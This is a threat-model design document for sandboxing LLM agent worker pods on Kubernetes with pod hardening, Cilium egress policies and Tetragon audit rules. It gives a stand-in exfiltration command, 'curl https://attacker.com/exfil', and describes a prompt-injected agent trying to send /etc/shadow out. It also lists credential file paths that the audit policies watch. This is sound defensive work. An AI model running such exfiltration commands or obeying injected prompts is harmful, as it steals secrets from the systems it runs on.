# Nightshift worker — threat model

This document is the rationale behind the chunk-9 deliverables:
`deploy/cilium/`, `deploy/tetragon/`, and the launcher's hardened
`SecurityContext`. It is intentionally narrow — it covers the worker
pod surface only.

## Trust boundary

Worker pods are **untrusted**. They run agent-generated tool calls
which originate from LLM output, which originates from prompt content
which originates from external users. Any of those layers may be
compromised, prompt-injected, or buggy. The worker pod is therefore
treated as a sandbox: assume the binary inside it can be made to
attempt arbitrary actions, and design the surrounding controls to
contain blast radius.

`nightshift-api` is **trusted**. It validates every worker callback
against the per-run HMAC credential (`internal/auth/worker.go`,
`internal/runtime/credential.go`) — a credential minted for run A
cannot post events against run B.

The chunk-9 deliverables sit between the two: even an in-trust
nightshift-api still needs a hardened sandbox around the workers it
launches.

## What the reference worker actually does

Establishing baseline behavior is what makes the policies tight.
The reference worker (`cmd/nightshift-worker/`) does exactly this and
nothing more:

| Behavior | Detail |
|---|---|
| Reads env vars | `NS_RUN_ID`, `NS_USER_ID`, `NS_SESSION_ID`, `NS_PROMPT`, `NS_API_URL`, `NS_WORKER_CREDENTIAL` |
| Opens a single gRPC connection | To `NS_API_URL`, presents `NS_WORKER_CREDENTIAL` as bearer |
| Calls four RPCs | `PostWorkerEvent`, `GetRunCancellation` (poll loop), `CompleteRun`, `FailRun` |
| Resolves DNS | To find the `nightshift-api` Service |
| Writes nothing to disk | No session-state directory, no scratch files, no logs (events go to stdout/stderr → pod logs) |
| Execs nothing | Single-process Go binary; no `os/exec`, no shell |

The worker auths to `nightshift-api` via the HMAC env credential,
**not** via the Kubernetes service-account token — so even if the SA
token were mounted, the worker would never read it.

## Defenses

Three layers, applied independently. None depends on the others; an
operator running on a non-Cilium / non-Tetragon cluster still gets the
launcher hardening.

### 1. Pod hardening (always on)

Applied unconditionally by `internal/runtime/kubernetes.go:buildJob`:

| Field | Setting | Why |
|---|---|---|
| `runAsNonRoot` | `true` | Block root-uid escapes. |
| `runAsUser` / `runAsGroup` / `fsGroup` | `65532` | Distroless nonroot UID. |
| `readOnlyRootFilesystem` | `true` | Prevent dropping payloads to the rootfs. |
| `allowPrivilegeEscalation` | `false` | No setuid escapes. |
| `capabilities.drop` | `["ALL"]` | No `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_OVERRIDE`, etc. |
| `seccompProfile.type` | `RuntimeDefault` | Block dangerous syscalls (`add_key`, `bpf`, `userfaultfd`, etc.). |
| `automountServiceAccountToken` | `false` | Worker never calls the K8s API; eliminates SA-token theft. |

These are hardcoded in the launcher (no values plumbing) because no
chunk-9 consumer needs to override them. If chunk 14's LLM worker
needs different UIDs (e.g. for a base image that doesn't bake 65532),
that PR adds the override path.

### 2. Cilium NetworkPolicy (`cilium.enabled`)

Three additive `CiliumNetworkPolicy` resources, all selecting on
`app.kubernetes.io/name: nightshift, app.kubernetes.io/component: worker`:

- **`00-default-deny.yaml`** — empty ingress + egress. Deny-all baseline.
- **`10-allow-dns.yaml`** — egress port 53 to kube-dns. L7 DNS proxy logs every query.
- **`20-allow-api-callback.yaml`** — egress to `nightshift-api` pods on the configured gRPC + HTTP ports.

Effect: a compromised agent that does `curl https://attacker.com/exfil`
has the connection blocked at the kernel before the syscall returns.
The agent has no way to exfiltrate, beacon, or scan the internal
network. The only legitimate destinations are the API itself and DNS.

**Forward note for chunk 14**: `nightshift-worker-claude` will need
egress to LLM provider APIs (e.g. `api.anthropic.com:443`). That allow
ships as a sibling CNP, not a relaxation of the default-deny.

### 3. Tetragon TracingPolicy (`tetragon.enabled`)

Three audit-only (`Post`) policies, all scoped via `podSelector` to
the worker labels:

- **`worker-exec-audit.yaml`** — every `sys_execve` (portable form; Tetragon resolves the arch-specific symbol). Reference worker emits zero. Any event is anomalous.
- **`worker-file-audit.yaml`** — reads of `/etc/shadow`, `/etc/passwd`, `/root/.ssh/`, `/var/run/secrets/kubernetes.io/serviceaccount/`. Writes to `/etc/`, `/var/log/`. (Writes will fail anyway under `readOnlyRootFilesystem`; the policy logs the attempt.)
- **`worker-network-audit.yaml`** — every non-loopback `tcp_connect`. Cilium drops at the packet level; this is the syscall-level audit trail with full pid/container context.

All Post-only. No Sigkill in chunk 9 — operators who want enforcement
calibrate against their LLM worker's expected behavior first, then
layer on `Sigkill` selectively. Audit-only also means false-positive
alerts don't kill production runs.

## What a successful attack would have to do

Putting it all together, an agent that has been prompt-injected to
exfiltrate `/etc/shadow` to `attacker.com` faces:

1. `readOnlyRootFilesystem` — can't write a tool to disk.
2. `dropALL` capabilities + `seccomp RuntimeDefault` — can't elevate or use unusual syscalls.
3. `automountServiceAccountToken: false` — can't steal the SA token.
4. Default-deny CNP — `connect()` to `attacker.com` returns `EPERM` at the kernel.
5. File-audit TracingPolicy — even reading `/etc/shadow` (which fails under nonroot, but) leaves a logged event with run-id.
6. Exec-audit TracingPolicy — any `bash -c '...'` it tries to fork leaves a logged event.

The result: no exfiltration channel, no forensic blind spot.

## What's explicitly out of scope

- **Container-runtime escape via kernel exploit.** Mitigation is host
  patching + node isolation; not addressable at the pod surface.
- **Side-channel attacks** (Spectre-class, timing). Not addressable
  here.
- **Resource exhaustion (CPU/memory bomb).** Mitigated by the
  per-run `Resources` limits the launcher applies, not by chunk 9.
- **The `nightshift-api` itself being compromised.** Different threat
  model; chunk 8c's auth stack is the relevant control.

## Verifying the controls locally

End-to-end probe recipe (cluster + CNI + Tetragon + chart toggles +
allow/deny + audit-event readout) lives in
[`deploy/charts/nightshift/README.md` § *Verifying enforcement on kind*](charts/nightshift/README.md#verifying-enforcement-on-kind).
That recipe is the canonical reproduction; both `deploy/cilium/` and
`deploy/tetragon/` point at it.

CI does not run this stack — the combination of KinD + Cilium +
Tetragon is heavy and slow; the chart's `helm template` render is the
per-PR gate.
